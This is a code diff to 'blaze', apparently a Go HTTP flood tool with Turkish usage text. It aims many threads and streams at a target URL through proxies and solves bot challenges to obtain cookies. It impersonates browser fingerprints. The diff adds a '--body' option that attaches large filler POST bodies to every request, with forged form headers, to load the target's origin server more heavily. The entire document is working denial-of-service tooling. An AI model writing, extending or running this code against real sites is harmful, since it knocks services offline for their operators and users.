@@ -1,10 +1,13 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -29,10 +32,11 @@ const (
 
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve] [--body=BOYUT]")
 		fmt.Println()
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k   (origin'e buyuk paket)")
 		os.Exit(1)
 	}
 
@@ -48,12 +52,16 @@ func main() {
 	method := "GET"
 	proxyArg := ""
 	solve := false
+	bodySize := 0
 
 	posArgs := []string{}
 	for _, arg := range os.Args[4:] {
-		if arg == "--solve" {
+		switch {
+		case arg == "--solve":
 			solve = true
-		} else {
+		case strings.HasPrefix(arg, "--body="):
+			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
+		default:
 			posArgs = append(posArgs, arg)
 		}
 	}
@@ -67,6 +75,13 @@ func main() {
 		proxyArg = posArgs[2]
 	}
 
+	// A body only ships on methods that carry one. If the user asked for a
+	// body but left the method at GET, promote to POST so the bytes actually
+	// reach the origin.
+	if bodySize > 0 && method == "GET" {
+		method = "POST"
+	}
+
 	var solvedCookies string
 	var solvedUA string
 	if solve {
@@ -78,7 +93,7 @@ func main() {
 		}
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
+	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve, bodySize)
 }
 
 type solverResult struct {
@@ -223,8 +238,24 @@ func formatTestResult(tag string, statusCode int, err error) string {
 	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool, bodySize int) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	// Pre-build the POST body once. The same buffer is shared (read-only) by
+	// every client's template via GetBody, so there's no per-request alloc.
+	var bodyBytes []byte
+	if bodySize > 0 {
+		bodyBytes = make([]byte, bodySize)
+		// urlencoded form shape: "f=AAAA..." so Content-Type matches a real
+		// browser form POST. First 2 bytes are the field name + '='.
+		bodyBytes[0] = 'f'
+		bodyBytes[1] = '='
+		for i := 2; i < len(bodyBytes); i++ {
+			bodyBytes[i] = 'A'
+		}
+		fmt.Printf("%sbody modu: %s %d byte/request (origin'e buyuk paket)%s\n",
+			gray, method, bodySize, reset)
+	}
 
 	// No artificial cap — use thread count directly so the VPS decides the ceiling.
 	totalTargetClients := threads
@@ -388,6 +419,9 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			}
 			if solvedCookies != "" {
 				tmpl.Header.Set("Cookie", solvedCookies)
+			}
+			if bodyBytes != nil {
+				attachBody(tmpl, bodyBytes, targetURL)
 			}
 			p := c.NewPipeline(workersPerClient)
 			p.SetTemplate(tmpl)
@@ -629,4 +663,42 @@ func mustInt(s, name string) int {
 		os.Exit(1)
 	}
 	return v
+}
+
+// mustBytes parses a size like "512", "16k", "2m" into a byte count.
+func mustBytes(s string) int {
+	s = strings.TrimSpace(strings.ToLower(s))
+	mult := 1
+	switch {
+	case strings.HasSuffix(s, "k"):
+		mult = 1024
+		s = strings.TrimSuffix(s, "k")
+	case strings.HasSuffix(s, "m"):
+		mult = 1024 * 1024
+		s = strings.TrimSuffix(s, "m")
+	}
+	v, err := strconv.Atoi(s)
+	if err != nil || v <= 0 {
+		fmt.Fprintf(os.Stderr, "%shata: gecersiz --body boyutu: %s (ornek: --body=16k)%s\n", red, s, reset)
+		os.Exit(1)
+	}
+	return v * mult
+}
+
+// attachBody wires a fixed body into a template request so FastDo can replay
+// it. GetBody hands a fresh reader to every send (the shallow template copy
+// shares one Body that would otherwise EOF after the first request). We also
+// set the headers a real browser sends on a form POST — Content-Type,
+// Content-Length (via ContentLength), and Origin — all of which already have
+// ordered slots in the per-browser HeaderOrder, so the fingerprint stays valid.
+func attachBody(tmpl *http.Request, body []byte, targetURL string) {
+	tmpl.Body = io.NopCloser(bytes.NewReader(body))
+	tmpl.ContentLength = int64(len(body))
+	tmpl.GetBody = func() (io.ReadCloser, error) {
+		return io.NopCloser(bytes.NewReader(body)), nil
+	}
+	tmpl.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	if u, err := url.Parse(targetURL); err == nil && u.Host != "" {
+		tmpl.Header.Set("Origin", u.Scheme+"://"+u.Host)
+	}
 }
